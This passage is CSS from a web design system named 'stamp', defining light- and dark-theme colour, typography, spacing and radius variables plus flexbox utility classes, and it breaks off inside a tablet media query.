#fdd7321a; --stamp-color-background-positive: #00bb531a; --stamp-color-background-informative: #009ee31a; --stamp-color-background-notification: #d70036; --stamp-color-background-inverse: #1f1e2f; --stamp-color-background-subtle: #dddee3; --stamp-color-background-strong: #86889d; --stamp-color-background-brand-deep: #D83D00; --stamp-color-background-brand-subtle: #e75204; --stamp-color-background-brand: #f56900; --stamp-color-background-variant: #f1f1f2; --stamp-color-background-default: #e7e8eb; --stamp-color-background-surface: #ffffff; --stamp-color-text-segment-selected: #ffffff; --stamp-color-text-segment-default: #4e4ee2; --stamp-color-text-link-visited: #d05aff; --stamp-color-text-link-pressed: #001a73; --stamp-color-text-link-hover: #4e4ee2; --stamp-color-text-link-on-brand: #ffffff; --stamp-color-text-link-subtle: #1f1e2f; --stamp-color-text-link-default: #4e4ee2; --stamp-color-text-icon-button-pressed: #001a73; --stamp-color-text-icon-button-default: #4e4ee2; --stamp-color-text-form-control-placeholder-disabled: #bec0cb; --stamp-color-text-form-control-placeholder-default: #67687f; --stamp-color-text-form-control-value-disabled: #86889d; --stamp-color-text-form-control-value-default: #1f1e2f; --stamp-color-text-date-input-today-disabled: #ffffff; --stamp-color-text-date-input-today-selected: #ffffff; --stamp-color-text-date-input-today-default: #ffffff; --stamp-color-text-date-input-date-disabled: #bec0cb; --stamp-color-text-date-input-date-selected: #1f1e2f; --stamp-color-text-date-input-date-pressed: #001a73; --stamp-color-text-date-input-date-hover: #4e4ee2; --stamp-color-text-date-input-date-subtle: #bec0cb; --stamp-color-text-date-input-date-strong: #1f1e2f; --stamp-color-text-date-input-date-default: #4e4ee2; --stamp-color-text-button-tertiary-pressed: #001a73; --stamp-color-text-button-tertiary-default: #4e4ee2; --stamp-color-text-button-secondary-pressed: #001a73; --stamp-color-text-button-secondary-default: #4e4ee2; --stamp-color-text-button-primary-pressed: #ffffff; --stamp-color-text-button-primary-default: #ffffff; --stamp-color-text-negative: #d70036; --stamp-color-text-positive: #008005; --stamp-color-text-inverse: #ffffff; --stamp-color-text-on-brand: #ffffff; --stamp-color-text-subtle: #67687f; --stamp-color-text-brand: #D83D00; --stamp-color-text-default: #1f1e2f; --stamp-color-heading-on-brand: #ffffff; --stamp-color-heading-subtle: #1f1e2f; --stamp-color-heading-brand: #e75204; --stamp-color-heading-default: #001a73; }

.stamp-theme-dark { --stamp-opacity-illustration-disabled: 60%; --stamp-opacity-illustration-default: 100%; --stamp-opacity-mix-subtle: 10%; --stamp-opacity-mix-strong: 90%; --stamp-opacity-mix-default: 30%; --stamp-opacity-backdrop: 60%; --stamp-blend-mode-disabled: Luminosity; --stamp-blend-mode-default: Normal; --stamp-border-width-l: 4px; --stamp-border-width-m: 2px; --stamp-border-width-s: 1px; --stamp-border-width-xs: 0.5px; --stamp-radius-xxl: 32px; --stamp-radius-xl: 24px; --stamp-radius-l: 16px; --stamp-radius-m: 8px; --stamp-radius-s: 6px; --stamp-radius-xs: 4px; --stamp-radius-xxs: 2px; --stamp-size-medium-illustration-m: 240px; --stamp-size-medium-illustration-s: 204px; --stamp-size-illustration-3-xl: 144px; --stamp-size-illustration-xxl: 120px; --stamp-size-illustration-xl: 96px; --stamp-size-illustration-l: 88px; --stamp-size-illustration-m: 80px; --stamp-size-illustration-s: 56px; --stamp-size-icon-l: 40px; --stamp-size-icon-m: 24px; --stamp-size-icon-s: 16px; --stamp-spacing-outer-xl: 88px; --stamp-spacing-outer-l: 56px; --stamp-spacing-outer-m: 40px; --stamp-spacing-outer-s: 24px; --stamp-spacing-outer-xs: 16px; --stamp-spacing-inner-4-xl: 56px; --stamp-spacing-inner-3-xl: 40px; --stamp-spacing-inner-xxl: 32px; --stamp-spacing-inner-xl: 24px; --stamp-spacing-inner-l: 16px; --stamp-spacing-inner-m: 12px; --stamp-spacing-inner-s: 8px; --stamp-spacing-inner-xs: 4px; --stamp-spacing-inner-xxs: 2px; --stamp-text-app-navigation-selected-letter-spacing: 0px; --stamp-text-app-navigation-selected-font-size: 12px; --stamp-text-app-navigation-selected-line-height: 1.6; --stamp-text-app-navigation-selected-font-weight: 700; --stamp-text-app-navigation-selected-font-family: Hanken Grotesk; --stamp-text-app-navigation-default-letter-spacing: 0px; --stamp-text-app-navigation-default-font-size: 12px; --stamp-text-app-navigation-default-line-height: 1.6; --stamp-text-app-navigation-default-font-weight: 400; --stamp-text-app-navigation-default-font-family: Hanken Grotesk; --stamp-text-step-todo-letter-spacing: 0px; --stamp-text-step-todo-font-size: 16px; --stamp-text-step-todo-line-height: 1.6; --stamp-text-step-todo-font-weight: 400; --stamp-text-step-todo-font-family: Hanken Grotesk; --stamp-text-step-default-letter-spacing: 0px; --stamp-text-step-default-font-size: 16px; --stamp-text-step-default-line-height: 1.6; --stamp-text-step-default-font-weight: 400; --stamp-text-step-default-font-family: Hanken Grotesk; --stamp-text-badge-default-letter-spacing: 0px; --stamp-text-badge-default-font-size: 14px; --stamp-text-badge-default-line-height: 1.05; --stamp-text-badge-default-font-weight: 400; --stamp-text-badge-default-font-family: Hanken Grotesk; --stamp-text-form-date-input-date-selected-letter-spacing: 0px; --stamp-text-form-date-input-date-selected-font-size: 18px; --stamp-text-form-date-input-date-selected-line-height: 1.4; --stamp-text-form-date-input-date-selected-font-weight: 700; --stamp-text-form-date-input-date-selected-font-family: Hanken Grotesk; --stamp-text-form-date-input-date-pressed-text-decoration: underline; --stamp-text-form-date-input-date-pressed-letter-spacing: 0px; --stamp-text-form-date-input-date-pressed-font-size: 18px; --stamp-text-form-date-input-date-pressed-line-height: 1.4; --stamp-text-form-date-input-date-pressed-font-weight: 400; --stamp-text-form-date-input-date-pressed-font-family: Hanken Grotesk; --stamp-text-form-date-input-date-hover-text-decoration: underline; --stamp-text-form-date-input-date-hover-letter-spacing: 0px; --stamp-text-form-date-input-date-hover-font-size: 18px; --stamp-text-form-date-input-date-hover-line-height: 1.4; --stamp-text-form-date-input-date-hover-font-weight: 400; --stamp-text-form-date-input-date-hover-font-family: Hanken Grotesk; --stamp-text-form-date-input-date-default-letter-spacing: 0px; --stamp-text-form-date-input-date-default-font-size: 18px; --stamp-text-form-date-input-date-default-line-height: 1.4; --stamp-text-form-date-input-date-default-font-weight: 400; --stamp-text-form-date-input-date-default-font-family: Hanken Grotesk; --stamp-text-form-data-list-body-highlighted-letter-spacing: 0px; --stamp-text-form-data-list-body-highlighted-text-decoration: underline; --stamp-text-form-data-list-body-highlighted-font-size: 14px; --stamp-text-form-data-list-body-highlighted-line-height: 1.6; --stamp-text-form-data-list-body-highlighted-font-weight: 400; --stamp-text-form-data-list-body-highlighted-font-family: Hanken Grotesk; --stamp-text-form-data-list-body-pressed-letter-spacing: 0px; --stamp-text-form-data-list-body-pressed-font-size: 14px; --stamp-text-form-data-list-body-pressed-line-height: 1.6; --stamp-text-form-data-list-body-pressed-font-weight: 400; --stamp-text-form-data-list-body-pressed-font-family: Hanken Grotesk; --stamp-text-form-data-list-body-hover-letter-spacing: 0px; --stamp-text-form-data-list-body-hover-font-size: 14px; --stamp-text-form-data-list-body-hover-line-height: 1.6; --stamp-text-form-data-list-body-hover-font-weight: 400; --stamp-text-form-data-list-body-hover-font-family: Hanken Grotesk; --stamp-text-form-data-list-body-default-letter-spacing: 0px; --stamp-text-form-data-list-body-default-font-size: 14px; --stamp-text-form-data-list-body-default-line-height: 1.6; --stamp-text-form-data-list-body-default-font-weight: 400; --stamp-text-form-data-list-body-default-font-family: Hanken Grotesk; --stamp-text-form-data-list-title-highlighted-letter-spacing: 0px; --stamp-text-form-data-list-title-highlighted-text-decoration: underline; --stamp-text-form-data-list-title-highlighted-font-size: 16px; --stamp-text-form-data-list-title-highlighted-line-height: 1.4; --stamp-text-form-data-list-title-highlighted-font-weight: 700; --stamp-text-form-data-list-title-highlighted-font-family: Hanken Grotesk; --stamp-text-form-data-list-title-pressed-letter-spacing: 0px; --stamp-text-form-data-list-title-pressed-font-size: 16px; --stamp-text-form-data-list-title-pressed-line-height: 1.4; --stamp-text-form-data-list-title-pressed-font-weight: 700; --stamp-text-form-data-list-title-pressed-font-family: Hanken Grotesk; --stamp-text-form-data-list-title-hover-letter-spacing: 0px; --stamp-text-form-data-list-title-hover-font-size: 16px; --stamp-text-form-data-list-title-hover-line-height: 1.4; --stamp-text-form-data-list-title-hover-font-weight: 700; --stamp-text-form-data-list-title-hover-font-family: Hanken Grotesk; --stamp-text-form-data-list-title-default-letter-spacing: 0px; --stamp-text-form-data-list-title-default-font-size: 16px; --stamp-text-form-data-list-title-default-line-height: 1.4; --stamp-text-form-data-list-title-default-font-weight: 700; --stamp-text-form-data-list-title-default-font-family: Hanken Grotesk; --stamp-text-form-feedback-letter-spacing: 0px; --stamp-text-form-feedback-font-size: 14px; --stamp-text-form-feedback-line-height: 1.4; --stamp-text-form-feedback-font-weight: 700; --stamp-text-form-feedback-font-family: Hanken Grotesk; --stamp-text-form-label-letter-spacing: 0px; --stamp-text-form-label-font-size: 16px; --stamp-text-form-label-line-height: 1.2; --stamp-text-form-label-font-weight: 700; --stamp-text-form-label-font-family: Hanken Grotesk; --stamp-text-hyperlink-pressed-letter-spacing: 0px; --stamp-text-hyperlink-pressed-text-decoration: underline; --stamp-text-hyperlink-pressed-font-size: 16px; --stamp-text-hyperlink-pressed-line-height: 1.6; --stamp-text-hyperlink-pressed-font-weight: 400; --stamp-text-hyperlink-pressed-font-family: Hanken Grotesk; --stamp-text-hyperlink-hover-letter-spacing: 0px; --stamp-text-hyperlink-hover-text-decoration: underline; --stamp-text-hyperlink-hover-font-size: 16px; --stamp-text-hyperlink-hover-line-height: 1.6; --stamp-text-hyperlink-hover-font-weight: 400; --stamp-text-hyperlink-hover-font-family: Hanken Grotesk; --stamp-text-hyperlink-default-letter-spacing: 0px; --stamp-text-hyperlink-default-text-decoration: underline; --stamp-text-hyperlink-default-font-size: 16px; --stamp-text-hyperlink-default-line-height: 1.6; --stamp-text-hyperlink-default-font-weight: 400; --stamp-text-hyperlink-default-font-family: Hanken Grotesk; --stamp-text-link-s-pressed-text-decoration: underline; --stamp-text-link-s-pressed-letter-spacing: 0px; --stamp-text-link-s-pressed-font-size: 14px; --stamp-text-link-s-pressed-line-height: 1.6; --stamp-text-link-s-pressed-font-weight: 400; --stamp-text-link-s-pressed-font-family: Hanken Grotesk; --stamp-text-link-s-hover-text-decoration: underline; --stamp-text-link-s-hover-letter-spacing: 0px; --stamp-text-link-s-hover-font-size: 14px; --stamp-text-link-s-hover-line-height: 1.6; --stamp-text-link-s-hover-font-weight: 400; --stamp-text-link-s-hover-font-family: Hanken Grotesk; --stamp-text-link-s-default-letter-spacing: 0px; --stamp-text-link-s-default-font-size: 14px; --stamp-text-link-s-default-line-height: 1.6; --stamp-text-link-s-default-font-weight: 400; --stamp-text-link-s-default-font-family: Hanken Grotesk; --stamp-text-link-m-pressed-text-decoration: underline; --stamp-text-link-m-pressed-letter-spacing: 0px; --stamp-text-link-m-pressed-font-size: 16px; --stamp-text-link-m-pressed-line-height: 1.6; --stamp-text-link-m-pressed-font-weight: 400; --stamp-text-link-m-pressed-font-family: Hanken Grotesk; --stamp-text-link-m-hover-text-decoration: underline; --stamp-text-link-m-hover-letter-spacing: 0px; --stamp-text-link-m-hover-font-size: 16px; --stamp-text-link-m-hover-line-height: 1.6; --stamp-text-link-m-hover-font-weight: 400; --stamp-text-link-m-hover-font-family: Hanken Grotesk; --stamp-text-link-m-default-letter-spacing: 0px; --stamp-text-link-m-default-font-size: 16px; --stamp-text-link-m-default-line-height: 1.6; --stamp-text-link-m-default-font-weight: 400; --stamp-text-link-m-default-font-family: Hanken Grotesk; --stamp-text-link-l-pressed-letter-spacing: 0px; --stamp-text-link-l-pressed-font-size: 16px; --stamp-text-link-l-pressed-text-decoration: underline; --stamp-text-link-l-pressed-line-height: 1.4; --stamp-text-link-l-pressed-font-weight: 700; --stamp-text-link-l-pressed-font-family: Hanken Grotesk; --stamp-text-link-l-hover-letter-spacing: 0px; --stamp-text-link-l-hover-font-size: 16px; --stamp-text-link-l-hover-text-decoration: underline; --stamp-text-link-l-hover-line-height: 1.4; --stamp-text-link-l-hover-font-weight: 700; --stamp-text-link-l-hover-font-family: Hanken Grotesk; --stamp-text-link-l-default-letter-spacing: 0px; --stamp-text-link-l-default-font-size: 16px; --stamp-text-link-l-default-line-height: 1.4; --stamp-text-link-l-default-font-weight: 700; --stamp-text-link-l-default-font-family: Hanken Grotesk; --stamp-text-cta-pressed-letter-spacing: 0px; --stamp-text-cta-pressed-font-size: 16px; --stamp-text-cta-pressed-text-decoration: underline; --stamp-text-cta-pressed-line-height: 1.4; --stamp-text-cta-pressed-font-weight: 700; --stamp-text-cta-pressed-font-family: Hanken Grotesk; --stamp-text-cta-hover-letter-spacing: 0px; --stamp-text-cta-hover-font-size: 16px; --stamp-text-cta-hover-text-decoration: underline; --stamp-text-cta-hover-line-height: 1.4; --stamp-text-cta-hover-font-weight: 700; --stamp-text-cta-hover-font-family: Hanken Grotesk; --stamp-text-cta-default-letter-spacing: 0px; --stamp-text-cta-default-font-size: 16px; --stamp-text-cta-default-line-height: 1.4; --stamp-text-cta-default-font-weight: 700; --stamp-text-cta-default-font-family: Hanken Grotesk; --stamp-text-price-xs-default-letter-spacing: 0px; --stamp-text-price-xs-default-font-size: 16px; --stamp-text-price-xs-default-line-height: 1.05; --stamp-text-price-xs-default-font-weight: 800; --stamp-text-price-xs-default-font-family: Hanken Grotesk; --stamp-text-price-s-decimal-letter-spacing: 0px; --stamp-text-price-s-decimal-font-size: 19px; --stamp-text-price-s-decimal-line-height: 1.05; --stamp-text-price-s-decimal-font-weight: 800; --stamp-text-price-s-decimal-font-family: Hanken Grotesk; --stamp-text-price-s-default-letter-spacing: 0px; --stamp-text-price-s-default-font-size: 19px; --stamp-text-price-s-default-line-height: 1.05; --stamp-text-price-s-default-font-weight: 800; --stamp-text-price-s-default-font-family: Hanken Grotesk; --stamp-text-price-m-decimal-letter-spacing: 0px; --stamp-text-price-m-decimal-font-size: 25px; --stamp-text-price-m-decimal-line-height: 1.05; --stamp-text-price-m-decimal-font-weight: 800; --stamp-text-price-m-decimal-font-family: Hanken Grotesk; --stamp-text-price-m-default-letter-spacing: 0px; --stamp-text-price-m-default-font-size: 25px; --stamp-text-price-m-default-line-height: 1.05; --stamp-text-price-m-default-font-weight: 800; --stamp-text-price-m-default-font-family: Hanken Grotesk; --stamp-text-price-l-decimal-letter-spacing: 0px; --stamp-text-price-l-decimal-font-size: 33px; --stamp-text-price-l-decimal-line-height: 1.05; --stamp-text-price-l-decimal-font-weight: 800; --stamp-text-price-l-decimal-font-family: Hanken Grotesk; --stamp-text-price-l-default-letter-spacing: 0px; --stamp-text-price-l-default-font-size: 33px; --stamp-text-price-l-default-line-height: 1.05; --stamp-text-price-l-default-font-weight: 800; --stamp-text-price-l-default-font-family: Hanken Grotesk; --stamp-text-body-s-emphasis-letter-spacing: 0px; --stamp-text-body-s-emphasis-font-size: 14px; --stamp-text-body-s-emphasis-line-height: 1.6; --stamp-text-body-s-emphasis-font-weight: 700; --stamp-text-body-s-emphasis-font-family: Hanken Grotesk; --stamp-text-body-s-default-letter-spacing: 0px; --stamp-text-body-s-default-font-size: 14px; --stamp-text-body-s-default-line-height: 1.6; --stamp-text-body-s-default-font-weight: 400; --stamp-text-body-s-default-font-family: Hanken Grotesk; --stamp-text-body-m-emphasis-letter-spacing: 0px; --stamp-text-body-m-emphasis-font-size: 16px; --stamp-text-body-m-emphasis-line-height: 1.6; --stamp-text-body-m-emphasis-font-weight: 700; --stamp-text-body-m-emphasis-font-family: Hanken Grotesk; --stamp-text-body-m-default-letter-spacing: 0px; --stamp-text-body-m-default-font-size: 16px; --stamp-text-body-m-default-line-height: 1.6; --stamp-text-body-m-default-font-weight: 400; --stamp-text-body-m-default-font-family: Hanken Grotesk; --stamp-text-body-l-emphasis-letter-spacing: 0px; --stamp-text-body-l-emphasis-font-size: 19px; --stamp-text-body-l-emphasis-line-height: 1.6; --stamp-text-body-l-emphasis-font-weight: 700; --stamp-text-body-l-emphasis-font-family: Hanken Grotesk; --stamp-text-body-l-default-letter-spacing: 0px; --stamp-text-body-l-default-font-size: 19px; --stamp-text-body-l-default-line-height: 1.6; --stamp-text-body-l-default-font-weight: 400; --stamp-text-body-l-default-font-family: Hanken Grotesk; --stamp-text-subtitle-s-letter-spacing: 0px; --stamp-text-subtitle-s-font-size: 18px; --stamp-text-subtitle-s-line-height: 1.2; --stamp-text-subtitle-s-font-weight: 500; --stamp-text-subtitle-s-font-family: Hanken Grotesk; --stamp-text-subtitle-m-letter-spacing: 0px; --stamp-text-subtitle-m-font-size: 19px; --stamp-text-subtitle-m-line-height: 1.2; --stamp-text-subtitle-m-font-weight: 500; --stamp-text-subtitle-m-font-family: Hanken Grotesk; --stamp-text-subtitle-l-letter-spacing: 0px; --stamp-text-subtitle-l-font-size: 24px; --stamp-text-subtitle-l-line-height: 1.2; --stamp-text-subtitle-l-font-weight: 500; --stamp-text-subtitle-l-font-family: Hanken Grotesk; --stamp-text-heading-xxs-letter-spacing: 0px; --stamp-text-heading-xxs-font-size: 14px; --stamp-text-heading-xxs-line-height: 1.05; --stamp-text-heading-xxs-font-weight: 500; --stamp-text-heading-xxs-font-family: Hanken Grotesk; --stamp-text-heading-xs-letter-spacing: 0px; --stamp-text-heading-xs-font-size: 16px; --stamp-text-heading-xs-line-height: 1.2; --stamp-text-heading-xs-font-weight: 700; --stamp-text-heading-xs-font-family: Hanken Grotesk; --stamp-text-heading-s-letter-spacing: 0px; --stamp-text-heading-s-font-size: 18px; --stamp-text-heading-s-line-height: 1.05; --stamp-text-heading-s-font-weight: 700; --stamp-text-heading-s-font-family: ABC ROM; --stamp-text-heading-m-letter-spacing: 0px; --stamp-text-heading-m-font-size: 21px; --stamp-text-heading-m-line-height: 1.05; --stamp-text-heading-m-font-weight: 700; --stamp-text-heading-m-font-family: ABC ROM; --stamp-text-heading-l-letter-spacing: -0.5px; --stamp-text-heading-l-font-size: 25px; --stamp-text-heading-l-line-height: 0.95; --stamp-text-heading-l-font-weight: 700; --stamp-text-heading-l-font-family: ABC ROM; --stamp-text-heading-xl-letter-spacing: -1px; --stamp-text-heading-xl-font-size: 32px; --stamp-text-heading-xl-line-height: 0.9; --stamp-text-heading-xl-font-weight: 700; --stamp-text-heading-xl-font-family: ABC ROM; --stamp-text-heading-xxl-letter-spacing: -1.5px; --stamp-text-heading-xxl-font-size: 40px; --stamp-text-heading-xxl-line-height: 0.9; --stamp-text-heading-xxl-font-weight: 700; --stamp-text-heading-xxl-font-family: ABC ROM; --stamp-text-heading-3-xl-letter-spacing: -1.5px; --stamp-text-heading-3-xl-font-size: 54px; --stamp-text-heading-3-xl-line-height: 0.9; --stamp-text-heading-3-xl-font-weight: 700; --stamp-text-heading-3-xl-font-family: ABC ROM; --stamp-drop-shadow-block-start: 0px -2px 8px #1f1e2fd9; --stamp-drop-shadow-flyout-down: 0px 2px 8px #1f1e2fd9; --stamp-color-overflow-block-end: linear-gradient(180deg, #ffffff00 0%, #6161ff4d 100%); --stamp-color-overflow-block-start: linear-gradient(180deg, #6161ff4d 0%, #ffffff00 100%); --stamp-color-overflow-inline-end: linear-gradient(90deg, #ffffff00 0%, #6161ff4d 100%); --stamp-color-overflow-inline-start: linear-gradient(90deg, #6161ff4d 0%, #ffffff00 100%); --stamp-color-icon-icon-button-tertiary-pressed: #9494ff; --stamp-color-icon-icon-button-tertiary-default: #9494ff; --stamp-color-icon-icon-button-secondary-pressed: #9494ff; --stamp-color-icon-icon-button-secondary-default: #9494ff; --stamp-color-icon-icon-button-primary-pressed: #ffffffe6; --stamp-color-icon-icon-button-primary-default: #ffffffe6; --stamp-color-icon-button-tertiary-pressed: #9494ff; --stamp-color-icon-button-tertiary-default: #9494ff; --stamp-color-icon-button-secondary-pressed: #9494ff; --stamp-color-icon-button-secondary-default: #9494ff; --stamp-color-icon-button-primary-pressed: #ffffffe6; --stamp-color-icon-button-primary-default: #ffffffe6; --stamp-color-icon-accent-inverse: #1f1e2f; --stamp-color-icon-accent-default: #1f1e2f; --stamp-color-icon-disabled: #515165; --stamp-color-icon-selected: #e75204; --stamp-color-icon-pressed: #9494ff; --stamp-color-icon-hover: #9494ff; --stamp-color-icon-negative: #ee3261; --stamp-color-icon-warning: #fdd732; --stamp-color-icon-positive: #00BB53; --stamp-color-icon-informative: #009ee3; --stamp-color-icon-sustainable: #00BB53; --stamp-color-icon-on-brand: #ffffffe6; --stamp-color-icon-subtle: #86889d; --stamp-color-icon-switch-active-disabled: #515165; --stamp-color-icon-switch-active-hover: #9494ff; --stamp-color-icon-switch-active-strong: #e75204; --stamp-color-icon-switch-normal-disabled: #515165; --stamp-color-icon-switch-normal-hover: #9494ff; --stamp-color-icon-switch-normal-strong: #ffffffe6; --stamp-color-icon-strong: #ffffffe6; --stamp-color-icon-brand: #e75204; --stamp-color-icon-default: #9494ff; --stamp-color-border-button-tertiary-pressed: #ffffff00; --stamp-color-border-button-tertiary-default: #ffffff00; --stamp-color-border-button-secondary-pressed: #9494ff; --stamp-color-border-button-secondary-default: #5555d7; --stamp-color-border-button-primary-pressed: #ffffff00; --stamp-color-border-button-primary-default: #ffffff00; --stamp-color-border-fallback: #ffffff00; --stamp-color-border-focus-outline: #9494ff; --stamp-color-border-disabled: #515165; --stamp-color-border-error: #ee3261; --stamp-color-border-selected: #e75204; --stamp-color-border-pressed: #9494ff; --stamp-color-border-hover: #9494ff; --stamp-color-border-negative: #ee3261; --stamp-color-border-warning: #fdd732; --stamp-color-border-positive: #008005; --stamp-color-border-informative: #009ee3; --stamp-color-border-strong: #a2a4b4; --stamp-color-border-brand: #C73C00; --stamp-color-border-default: #515165; --stamp-color-background-badge-brand: #C73C00; --stamp-color-background-badge-important: #d70036; --stamp-color-background-badge-secondary: #2c2b40; --stamp-color-background-badge-primary: #5555d7; --stamp-color-background-app-brand: #2c2b40; --stamp-color-background-app-default: #13121C; --stamp-color-background-segment-selected: #5555d7; --stamp-color-background-segment-default: #ffffff00; --stamp-color-background-icon-button-tertiary-pressed: #ffffff00; --stamp-color-background-icon-button-tertiary-default: #ffffff00; --stamp-color-background-icon-button-secondary-pressed: #34334d; --stamp-color-background-icon-button-secondary-default: #2c2b40; --stamp-color-background-icon-button-primary-pressed: #4646a9; --stamp-color-background-icon-button-primary-default: #5555d7; --stamp-color-background-date-input-today-disabled: #515165; --stamp-color-background-date-input-today-default: #a2a4b4; --stamp-color-background-date-input-date-disabled: #2c2b40; --stamp-color-background-date-input-date-range: #ffede04d; --stamp-color-background-date-input-date-default: #1f1e2f; --stamp-color-background-data-list-selected: #ffffff00; --stamp-color-background-data-list-pressed: #2c2b40; --stamp-color-background-data-list-hover: #2c2b40; --stamp-color-background-data-list-default: #ffffff00; --stamp-color-background-card-brand-red-accent: #ab260d; --stamp-color-background-card-brand-red-default: #bf2f14; --stamp-color-background-card-brand-green-accent: #06412a; --stamp-color-background-card-brand-green-default: #085235; --stamp-color-background-card-brand-blue-accent: #4646a9; --stamp-color-background-card-brand-blue-default: #5555d7; --stamp-color-background-card-brand-dark-blue-accent: #03134d; --stamp-color-background-card-brand-dark-blue-default: #081c67; --stamp-color-background-card-brand-orange-accent: #AD3100; --stamp-color-background-card-brand-orange-default: #C73C00; --stamp-color-background-card-inverse-accent: #1f1e2f; --stamp-color-background-card-inverse-default: #1f1e2f; --stamp-color-background-card-neutral-accent: #34334d; --stamp-color-background-card-neutral-default: #2c2b40; --stamp-color-background-button-tertiary-pressed: #ffffff00; --stamp-color-background-button-tertiary-default: #ffffff00; --stamp-color-background-button-secondary-pressed: #ffffff00; --stamp-color-background-button-secondary-default: #ffffff00; --stamp-color-background-button-primary-pressed: #4646a9; --stamp-color-background-button-primary-default: #5555d7; --stamp-color-background-switch-button-active-disabled: #2c2b40; --stamp-color-background-switch-button-active-default: #1f1e2f; --stamp-color-background-switch-button-normal-disabled: #2c2b40; --stamp-color-background-switch-button-normal-default: #1f1e2f; --stamp-color-background-switch-active-disabled: #515165; --stamp-color-background-switch-active-default: #C73C00; --stamp-color-background-switch-normal-disabled: #515165; --stamp-color-background-switch-normal-default: #86889d; --stamp-color-background-disabled: #2c2b40; --stamp-color-background-negative: #ee32611a; --stamp-color-background-warning: #fdd7321a; --stamp-color-background-positive: #00bb531a; --stamp-color-background-informative: #009ee31a; --stamp-color-background-notification: #d70036; --stamp-color-background-inverse: #ffffffe6; --stamp-color-background-subtle: #424054; --stamp-color-background-strong: #86889d; --stamp-color-background-brand-subtle: #C73C00; --stamp-color-background-brand: #424054; --stamp-color-background-variant: #2c2b40; --stamp-color-background-default: #34334d; --stamp-color-background-surface: #1f1e2f; --stamp-color-text-segment-selected: #ffffffe6; --stamp-color-text-segment-default: #9494ff; --stamp-color-text-link-visited: #d05aff; --stamp-color-text-link-pressed: #9494ff; --stamp-color-text-link-hover: #9494ff; --stamp-color-text-link-on-brand: #ffffffe6; --stamp-color-text-link-subtle: #ffffffe6; --stamp-color-text-link-default: #9494ff; --stamp-color-text-icon-button-pressed: #9494ff; --stamp-color-text-icon-button-default: #9494ff; --stamp-color-text-form-control-placeholder-disabled: #515165; --stamp-color-text-form-control-placeholder-default: #ffffffe6; --stamp-color-text-form-control-value-disabled: #86889d; --stamp-color-text-form-control-value-default: #ffffffe6; --stamp-color-text-date-input-today-disabled: #ffffffe6; --stamp-color-text-date-input-today-selected: #ffffffe6; --stamp-color-text-date-input-today-default: #ffffffe6; --stamp-color-text-date-input-date-disabled: #86889d; --stamp-color-text-date-input-date-selected: #dddee3; --stamp-color-text-date-input-date-pressed: #9494ff; --stamp-color-text-date-input-date-hover: #9494ff; --stamp-color-text-date-input-date-subtle: #a2a4b4; --stamp-color-text-date-input-date-strong: #dddee3; --stamp-color-text-date-input-date-default: #9494ff; --stamp-color-text-button-tertiary-pressed: #9494ff; --stamp-color-text-button-tertiary-default: #9494ff; --stamp-color-text-button-secondary-pressed: #9494ff; --stamp-color-text-button-secondary-default: #9494ff; --stamp-color-text-button-primary-pressed: #ffffffe6; --stamp-color-text-button-primary-default: #ffffffe6; --stamp-color-text-negative: #FF5775; --stamp-color-text-positive: #00BB53; --stamp-color-text-inverse: #1f1e2f; --stamp-color-text-on-brand: #ffffffe6; --stamp-color-text-subtle: #ffffffe6; --stamp-color-text-brand: #C73C00; --stamp-color-text-default: #ffffffe6; --stamp-color-heading-on-brand: #ffffffe6; --stamp-color-heading-subtle: #ffffffe6; --stamp-color-heading-brand: #e75204; --stamp-color-heading-default: #ffffffe6; }

.stamp-provider { color: var(--stamp-color-text-default); font-family: var(--stamp-text-body-m-default-font-family), sans-serif; font-weight: var(--stamp-text-body-m-default-font-weight); line-height: var(--stamp-text-body-m-default-line-height); font-size: var(--stamp-text-body-m-default-font-size); letter-spacing: var(--stamp-text-body-m-default-letter-spacing); font-synthesis: none; font-feature-settings: &quot;ss03&quot;, &quot;ss01&quot;; }

.stamp-flex { display: flex; }

.stamp-flex--direction-row { flex-direction: row; }

.stamp-flex--direction-column { flex-direction: column; }

.stamp-flex--wrap-wrap { flex-wrap: wrap; }

.stamp-flex--align-items-flex-start { align-items: flex-start; }

.stamp-flex--align-items-flex-end { align-items: flex-end; }

.stamp-flex--align-items-center { align-items: center; }

.stamp-flex--align-items-baseline { align-items: baseline; }

.stamp-flex--align-items-stretch { align-items: stretch; }

.stamp-flex--justify-content-flex-start { justify-content: flex-start; }

.stamp-flex--justify-content-flex-end { justify-content: flex-end; }

.stamp-flex--justify-content-center { justify-content: center; }

.stamp-flex--justify-content-space-between { justify-content: space-between; }

.stamp-flex--justify-content-space-around { justify-content: space-around; }

.stamp-flex--row-gap-mobile-xxs { row-gap: var(--stamp-spacing-inner-xxs); }

.stamp-flex--row-gap-mobile-xs { row-gap: var(--stamp-spacing-inner-xs); }

.stamp-flex--row-gap-mobile-s { row-gap: var(--stamp-spacing-inner-s); }

.stamp-flex--row-gap-mobile-m { row-gap: var(--stamp-spacing-inner-m); }

.stamp-flex--row-gap-mobile-l { row-gap: var(--stamp-spacing-inner-l); }

.stamp-flex--row-gap-mobile-xl { row-gap: var(--stamp-spacing-inner-xl); }

.stamp-flex--row-gap-mobile-xxl { row-gap: var(--stamp-spacing-inner-xxl); }

.stamp-flex--row-gap-mobile-3-xl { row-gap: var(--stamp-spacing-inner-3-xl); }

.stamp-flex--row-gap-mobile-4-xl { row-gap: var(--stamp-spacing-inner-4-xl); }

.stamp-flex--column-gap-mobile-xxs { column-gap: var(--stamp-spacing-inner-xxs); }

.stamp-flex--column-gap-mobile-xs { column-gap: var(--stamp-spacing-inner-xs); }

.stamp-flex--column-gap-mobile-s { column-gap: var(--stamp-spacing-inner-s); }

.stamp-flex--column-gap-mobile-m { column-gap: var(--stamp-spacing-inner-m); }

.stamp-flex--column-gap-mobile-l { column-gap: var(--stamp-spacing-inner-l); }

.stamp-flex--column-gap-mobile-xl { column-gap: var(--stamp-spacing-inner-xl); }

.stamp-flex--column-gap-mobile-xxl { column-gap: var(--stamp-spacing-inner-xxl); }

.stamp-flex--column-gap-mobile-3-xl { column-gap: var(--stamp-spacing-inner-3-xl); }

.stamp-flex--column-gap-mobile-4-xl { column-gap: var(--stamp-spacing-inner-4-xl); }

@media screen and (min-width: 481px) {
  .stamp-flex--row-gap-tablet-xxs { row-gap: var(--stamp-spacing-inner-xxs); }
  .stamp-flex--row-gap-tablet-xs { row-gap: var(--stamp-spacing-inner-xs); }
  .stamp-flex--row-gap-tablet-s { row-gap: var(--stamp-spacing-inner-s); }
  .stamp-flex--row-gap-tablet-m { row-gap: var(--stamp-spacing-inner-m); }
  .stamp-flex--row-gap-tablet-l { row-gap: var(--stamp-spacing-inner-l); }
